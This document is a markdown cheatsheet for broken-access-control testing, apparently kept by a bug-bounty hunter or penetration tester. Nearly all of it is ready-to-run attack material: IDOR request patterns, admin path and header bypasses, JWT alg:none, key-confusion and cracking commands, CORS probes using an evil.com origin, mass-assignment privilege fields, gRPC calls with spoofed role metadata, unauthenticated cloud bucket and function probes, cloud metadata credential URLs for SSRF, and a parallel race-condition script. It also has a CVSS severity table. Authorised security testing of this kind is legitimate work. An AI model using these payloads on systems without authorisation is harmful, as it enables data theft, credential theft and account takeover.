---
tags: [bac, quick-reference, cheatsheet]
type: cheatsheet
date: 2026-03-10
version: 2
---

# ⚡ BAC Quick Reference Cheatsheet — v2

> Keep open during active tests. Every critical payload and command in one place.

---

## 🔴 IDOR — Instant Test Pattern

```http
# Step 1: Your resource (baseline)
GET /api/{resource}/YOUR_ID
Authorization: Bearer YOUR_TOKEN
→ Note: status, body structure, size

# Step 2: Victim's resource (attack)
GET /api/{resource}/VICTIM_ID
Authorization: Bearer YOUR_TOKEN  ← same token!
→ Returns victim data? IDOR confirmed.
```

**ID locations**: URL path · `?id=` query · JSON body · `X-User-Id` header · cookie · email links · WS messages

**ID types to try**: `1338` (sequential) · decoded base64 · MD5 of known value · zero UUID `00000000-...` · admin user ID `1`

---

## 🟠 Vertical PrivEsc — Instant Test

```bash
# Direct endpoint probe (low-priv session):
for path in /admin /admin/users /api/admin /api/v1/admin /management /internal; do
  code=$(curl -sk -o/dev/null -w "%{http_code}" -H "Cookie: SESSION" "TARGET$path")
  echo "$code $path"
done | grep -v "403\|401\|404"

# Add bypass headers on every 403:
curl -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: S" TARGET/admin/users
curl -H "X-Original-URL: /admin/users" -H "Cookie: S" TARGET/
```

---

## 🟡 Path Bypass — Full List

```
/admin/users  →  /ADMIN/users
              →  /admin//users
              →  /admin/./users
              →  /%61dmin/users
              →  /admin;/users          Spring Boot
              →  /admin..;/users        Spring Boot
              →  /api/../admin/users
              →  /admin%2fusers
              →  /admin%00/users
              →  /public/../../admin/users
```

---

## 🔵 JWT — Full Attack Sequence

```bash
# 1. Decode
echo "PAYLOAD_PART" | base64 -d 2>/dev/null; echo

# 2. All attacks via jwt_tool:
python3 jwt_tool.py TOKEN -T          # interactive tamper mode
python3 jwt_tool.py TOKEN -X a        # alg:none
python3 jwt_tool.py TOKEN -X s        # RS256→HS256
python3 jwt_tool.py TOKEN -C -d rockyou.txt   # crack HMAC

# 3. Hashcat crack (fast):
hashcat -a 0 -m 16500 TOKEN /usr/share/seclists/Fuzzing/jwt-secrets.txt

# 4. Claims to inject:
{"role":"admin","isAdmin":true,"scope":"admin:all","permissions":["*"]}
```

---

## 🟣 CORS — 60-Second Check

```bash
# Quick check:
curl -sk -H "Origin: https://evil.com" -H "Cookie: SESSION" \
  -I TARGET/api/me | grep -i "access-control"

# Vulnerable if BOTH:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Test all bypass origins:
for o in "https://evil.com" "null" "https://TARGET.evil.com" "http://localhost"; do
  echo -n "$o: "
  curl -sk -H "Origin: $o" -H "Cookie: SESSION" -I TARGET/api/me \
    | grep -i "access-control-allow-origin"
done
```

---

## 🟢 Mass Assignment — Inject Field List

```json
{"isAdmin":true, "is_admin":true, "role":"admin",
 "admin":true, "staff":true, "verified":true,
 "plan":"enterprise", "credits":99999,
 "subscriptionLevel":"premium", "organizationId":"TARGET_ORG"}
```

---

## ⚫ HTTP Methods & Override

```
Test all 8 on every blocked endpoint:
GET  POST  PUT  PATCH  DELETE  HEAD  OPTIONS  TRACE

Override blocked methods:
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
POST /endpoint?_method=DELETE
```

---

## ⚙️ gRPC — Quick Test

```bash
# Is reflection on? (enumerate everything)
grpcurl -plaintext TARGET:50051 list

# Call method without auth:
grpcurl -plaintext -d '{"user_id": "1"}' TARGET:50051 svc.UserService/GetUser

# Call with low-priv token + injected role metadata:
grpcurl -plaintext \
  -H "authorization: Bearer LOW_PRIV_TOKEN" \
  -H "x-user-role: admin" \
  -H "x-internal-user: true" \
  -d '{"user_id": "9999"}' \
  TARGET:50051 svc.AdminService/GetAllUsers

# BOLA: swap user IDs:
grpcurl -plaintext -H "authorization: Bearer MY_TOKEN" \
  -d '{"user_id": "VICTIM_ID"}' TARGET:50051 svc.UserService/GetProfile
```

---

## ☁️ Cloud — Quick Checks

```bash
# S3 public bucket:
aws s3 ls s3://TARGET-backup --no-sign-request
aws s3 ls s3://TARGET-uploads --no-sign-request

# Lambda Function URL (find in JS, then test unauthed):
curl https://FUNCTION_ID.lambda-url.us-east-1.on.aws/
curl https://FUNCTION_ID.lambda-url.us-east-1.on.aws/admin

# API Gateway no-auth endpoint:
curl https://API_ID.execute-api.us-east-1.amazonaws.com/prod/admin/users

# Cloud IMDS via SSRF:
# AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP:   http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
# Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

---

## 🏁 Race Conditions — Quick Fire

```python
# Python (asyncio, fires simultaneously):
import asyncio, aiohttp
async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [s.post(URL, headers=HEADERS, json=BODY) for _ in range(50)]
        await asyncio.gather(*tasks)
asyncio.run(race())
```

```
Burp Turbo Intruder:
  gate='race' → engine.openGate('race')
  
Burp Repeater (HTTP/2 single-packet):
  Duplicate tab ×20 → "Send group in parallel (last-byte sync)"
```

**Targets**: `/activate` · `/redeem` · `/withdraw` · `/refund` · `/cancel` · `/claim`

---

## 📊 CVSS Quick Reference

| Bug | CVSS |
|---|---|
| Unauth IDOR → PII (name, email, phone) | 9.1 Critical |
| Auth IDOR → PII + write/delete | 8.1 High |
| Auth IDOR → non-PII read-only | 6.5 Medium |
| Vertical privesc: unauth → admin | 9.8 Critical |
| Vertical privesc: user → admin | 8.8 High |
| CORS + credentials → account data | 7.4 High |
| JWT role manipulation → admin | 8.8 High |
| S3 public write (malicious file host) | 8.6 High |
| Lambda URL unauth → admin function | 9.8 Critical |
| Race condition → free premium access | 7.5 High |
| gRPC method unauthed → user data | 8.1 High |

---

## 🔗 Jump To
[[IDOR]] · [[Privilege-Escalation]] · [[JWT-Misconfiguration]] · [[gRPC-BAC]]
[[Cloud-Serverless-BAC]] · [[Race-Condition-BAC]] · [[Advanced-BAC-Chains]]
[[Testing-Checklist]] · [[Bug-Report-Template]] · [[Findings-Database]]

---
*v2 — Tags: #cheatsheet #quick-reference #bac*
